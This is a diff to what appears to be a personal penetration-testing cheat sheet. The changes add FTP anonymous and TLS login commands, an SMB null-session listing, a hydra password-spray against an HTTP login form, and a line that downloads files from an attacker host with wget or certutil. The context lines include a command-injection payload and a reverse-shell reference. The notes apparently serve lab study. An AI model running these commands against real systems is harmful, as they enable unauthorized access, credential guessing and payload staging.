@@ -8,7 +8,9 @@ services/version exploit
 services/version webshell plugin
 
 Port 21 FTP
-$ ftp ipadd
+$ ftp anonymous@ipadd
+$ ftp-ssl -z secure -z verify=0 -p ipadd
+$ ftp-ssl -z secure -z verify=0 -z cipher="$(openssl ciphers -tls1)" -p ipadd
 $ info || put file.txt (cek info and put file)
 
 Port 25 SMTP
@@ -20,6 +22,7 @@ $ nmap --script=smb-vuln* -oN nmap/script_smbvuln -v --min-rate 10000 -p 139,445
 $ smbmap -H ipadd
 $ smbmap -u '' -p '' -R -H 192.168.189.98
 $ smbclient //ipadd/dir
+$ smbclient -U '' -L //ip
 $ smbclient -L //IP -N
 $ smbclient -N //IP/tmp -> dir, put
 $ add [global] client min protocol=NT1
@@ -98,8 +101,14 @@ Reverse Shell:
 https://pentestmonkey.net/
 revershell
 
+Transfer file:
+python -m http.server 80 | wget http://ip/file -O file | certutil -urlcache -split -f http://ip/file
+
 Find Command Injection Vuln:
 {"username":"admin; ls -la #"}
+
+Hydra Password Spray:
+hydra -I -f -L username.txt -P pass.txt $IP -s 8081 http-post-form 'burppath:username=^USER64^&password=^PASS64^:Forbidden'
 
 Find Email sender:
 $ less /var/mail/admin
